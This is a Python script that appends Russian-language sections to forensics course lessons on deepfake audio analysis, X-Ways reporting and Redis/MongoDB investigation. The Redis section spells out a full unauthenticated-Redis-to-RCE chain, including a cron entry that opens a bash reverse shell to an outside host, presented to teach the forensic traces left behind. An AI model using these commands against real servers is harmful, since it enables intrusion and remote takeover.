#!/usr/bin/env python3
"""Batch C4c — third layer for media-deepfake, tool-xways, web-mongodb-redis."""
from __future__ import annotations
import re, sys

ADDS = {}

ADDS["media-deepfake"] = r"""## Практический пример: аудиозвонок «от директора»

Сотрудник получил звонок якобы от директора с просьбой перевести деньги. Есть запись
разговора. Ход анализа:

1. `ffprobe call.wav` / `exiftool call.wav` — формат, битрейт, метаданные. Часто это
   VoIP-поток, перекодированный несколько раз, — метаданные бедны.
2. Спектрограмма (`sox ... spectrogram`) — ищем ровный «синтетический» спектр и
   отсутствие дыхания.
3. Слушаем паузы: у клонированного голоса они слишком ровные или, наоборот, обрывистые
   на склейках.
4. Сравниваем с известной записью голоса директора (если есть) — форманты, тембр,
   темп.
5. Проверяем контекст: номер звонящего, время, соответствие реальным событиям.

Итог — оценка «вероятно синтез» с перечислением признаков, а не категоричное
утверждение. В таких делах важен и организационный контекст: процедура подтверждения
переводов.

## Ключевой вывод

Deepfake-форензика не даёт бинарного ответа. Работает набор признаков — визуальные
швы, аудио-аномалии, частотные следы, метаданные и провенанс — и итоговая **оценка
уверенности**. Сильный результат — когда несколько независимых методов указывают в
одну сторону и есть контекст. Детектор сам по себе — лишь один сигнал."""

ADDS["tool-xways"] = r"""## Экспорт и отчётность

X-Ways формирует отчёты, пригодные для передачи: таблицы найденных файлов с
метаданными (имя, путь, размер, времена, хеши) и выбранные файлы. Практика:

- отмечай **галочками** только релевантные объекты, а не весь образ;
- включай **хеши** в отчёт (целостность);
- фиксируй **версию X-Ways** и настройки фильтров — для воспроизводимости;
- экспортируй файлы в отдельный каталог, не смешивая с оригиналом;
- веди **журнал действий** (что и когда сделано).

Отчёт — это результат экспертизы; он должен позволить другому специалисту повторить
шаги и прийти к тем же выводам.

## Настройка под задачу

X-Ways гибок, но требует настройки:

- для **больших образов** — сначала индекс, потом фильтры;
- для **поиска конкретного** — сразу фильтр по пути/времени;
- для **восстановления** — включить режим recover deleted;
- для **карвинга** — simultaneous search по нужной сигнатуре;
- для **реестра** — открыть кусты как файлы.

Неправильная настройка ведёт к пропущенным артефактам или, наоборот, к тонам шума.
Начинай с широкого фильтра, затем сужай.

## Ключевой вывод

X-Ways — быстрый и гибкий инструмент для анализа образов: read-only работа, фильтры по
типу/времени/сигнатуре, восстановление удалённого, парсинг реестра и артефактов,
таймлайн и отчёты. Он экономит время за счёт встроенных парсеров и индекса. Но, как
любой инструмент, он не заменяет аналитика: интерпретация находок, оценка достоверности
и грамотный отчёт остаются за человеком."""

ADDS["web-mongodb-redis"] = r"""## Практический пример: Redis → RCE

Классическая цепочка атаки на открытый Redis:

1. Проверка доступа: `redis-cli -h target INFO` без `AUTH`.
2. Установка пути: `redis-cli -h target CONFIG SET dir /var/spool/cron/`.
3. Запись «данных»: `redis-cli -h target SET x "\n\n*/5 * * * * root bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n\n"`.
4. Сохранение: `redis-cli -h target SAVE` — Redis пишет RDB-файл по указанному пути.
5. Cron подхватывает файл → reverse shell.

Форензик-следы: в логах Redis — `CONFIG SET dir`, `SAVE`; в файловой системе — файл
`dump.rdb` в необычном каталоге; в cron — подозрительная запись; в логах ОС — новый
процесс/соединение. Так по «сервисным» следам восстанавливают путь атаки.

## Ключевой вывод

Redis и MongoDB часто выставляют наружу без пароля — это делает их и лёгкой целью, и
важным источником артефактов. Redis-следы (`CONFIG`/`SAVE`/`MODULE`), AOF-журнал,
oplog MongoDB, профилировщик и сетевые логи позволяют восстановить, что и кто делал с
базой. Помни: база данных — это хост; после доступа к сервису анализируй и саму машину
(пользователи, cron, ключи, автозапуск), потому что компромисс сервиса часто означает
компромисс хоста."""

def main() -> int:
    base = "content/forensics/"
    for lid, add in ADDS.items():
        path = base + lid + ".md"
        s = open(path, encoding="utf-8").read()
        m = re.search(r"^## Квиз\s*$", s, re.MULTILINE)
        if not m:
            print("SKIP (no quiz):", lid); continue
        out = s[:m.start()] + add + "\n\n" + s[m.start():]
        open(path, "w", encoding="utf-8").write(out)
        print("appended", lid)
    return 0

if __name__ == "__main__":
    sys.exit(main())
